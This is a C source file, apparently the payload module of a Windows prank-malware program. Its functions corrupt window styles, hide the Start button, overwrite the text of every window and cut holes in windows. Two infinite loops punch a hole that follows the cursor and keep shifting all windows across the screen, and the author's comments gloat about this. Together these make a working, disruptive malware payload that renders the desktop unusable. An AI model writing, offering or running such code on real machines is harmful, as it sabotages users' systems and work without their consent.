#include "dec.h"

int StyleFucker() {
	HWND fwh = GetForegroundWindow();

	SetWindowLong(fwh, GWL_STYLE, random());
	SetWindowLong(fwh, GWL_EXSTYLE, random());
	return 0;
}

int WindowTrails() {
	HWND pwh = FindWindow(L"Progman", NULL);

	SetWindowRgn(pwh, CreateRectRgn(0, 0, 0, 0), TRUE);
	return 0;
}

int SetWindowIcon() {
	HWND fwh = GetForegroundWindow();

	SendMessage(fwh, WM_SETICON, ICON_BIG, (LPARAM)LoadIcon(NULL, IDI_WARNING));
	SendMessage(fwh, WM_SETICON, ICON_SMALL, (LPARAM)LoadIcon(NULL, IDI_WARNING));
	return 0;
}

int FlipWindowLeft() {
	SetWindowLong(GetForegroundWindow(), GWL_EXSTYLE, WS_EX_LAYOUTRTL);
	return 0;
}

int CircularWindows() {
	HWND fwh = GetForegroundWindow();
	RECT fwd;

	GetWindowRect(fwh, &fwd);

	SetWindowRgn(fwh, CreateEllipticRgn(0, 0, fwd.right - fwd.left, fwd.bottom - fwd.top), TRUE);
	return 0;
}

int FlipWindowRight() {
	SetWindowLong(GetForegroundWindow(), GWL_EXSTYLE, WS_EX_LEFT);
	return 0;
}

int HideStartButton() {
	HWND stwh = FindWindow(L"Shell_TrayWnd", NULL);
	HWND sbwh = FindWindowEx(stwh, NULL, L"Start", NULL);

	ShowWindow(sbwh, SW_HIDE);
	return 0;
}

int ShowAllWindows() {
	EnumChildWindows(GetDesktopWindow(), &ShowWindowProc, 0);
	return 0;
}

BOOL CALLBACK ShowWindowProc(HWND hwnd, LPARAM lParam) {
	RECT fwd;

	GetWindowRect(hwnd, &fwd);

	SetWindowPos(hwnd, NULL, fwd.left, fwd.top, fwd.right - fwd.left, fwd.bottom - fwd.top, SWP_SHOWWINDOW | SWP_NOSIZE);
	return TRUE;
}

int SetAllWindowsText() {
	EnumChildWindows(GetDesktopWindow(), &WindowTextProc, 0);
	return 0;
}

BOOL CALLBACK WindowTextProc(HWND hwnd, LPARAM lParam) {
	SendMessageTimeout(hwnd, WM_SETTEXT, 0, (LPARAM)L"exampletext", SMTO_ABORTIFHUNG, 0, NULL);
	return TRUE;
}

int AllWindowsCreateHole() {
	EnumWindows(&CreateWindowHoleProc, 0);
	return 0;
}

BOOL CALLBACK CreateWindowHoleProc(HWND hwnd, LPARAM lParam) {
	RECT fwd;

	GetWindowRect(hwnd, &fwd);

	HRGN wr = CreateRectRgn(0, 0, fwd.right - fwd.left, fwd.bottom - fwd.top);

	/* just so the code isnt slop */
	int cx = (fwd.right - fwd.left) / 2;
	int cy = (fwd.bottom - fwd.top) / 2;

	HRGN hr = CreateEllipticRgn(cx - 200, cy - 200, cx + 200, cy + 200);

	CombineRgn(wr, wr, hr, RGN_XOR);

	SetWindowRgn(hwnd, wr, FALSE);

	return TRUE;
}

/* this one is pure evil lmao */

int CreateHoleAroundCursor() {
	int cx;
	int cy;
	HRGN wr;
	HRGN hr;
	HWND fwh;
	RECT fwd;
	POINT cc;

	while (TRUE) {
		fwh = GetForegroundWindow();
		
		GetWindowRect(fwh, &fwd);

		GetCursorPos(&cc);

		cx = cc.x - fwd.left;
		cy = cc.y - fwd.top;

		wr = CreateRectRgn(0, 0, fwd.right - fwd.left, fwd.bottom - fwd.top);

		hr = CreateEllipticRgn(cx - 32, cy - 32, cx + 32, cy + 32);

		CombineRgn(wr, wr, hr, RGN_XOR);

		SetWindowRgn(fwh, wr, FALSE);

		Sleep(1);
	}
}

int MoveAllWindows(LPARAM lParam) {
	while (TRUE) {
		EnumWindows(&MoveWindowsProc, lParam);
	}
}

BOOL CALLBACK MoveWindowsProc(HWND hwnd, LPARAM lParam) {
	METRICS *m = (METRICS*)lParam;
	RECT fwd;

	GetWindowRect(hwnd, &fwd);

	SetWindowPos(hwnd, NULL, fwd.left + 1, fwd.top, 0, 0, SWP_NOSIZE);

	if (fwd.left > m->dw)
		SetWindowPos(hwnd, NULL, -(fwd.right - fwd.left), fwd.top, 0, 0, SWP_NOSIZE);

	return TRUE;
}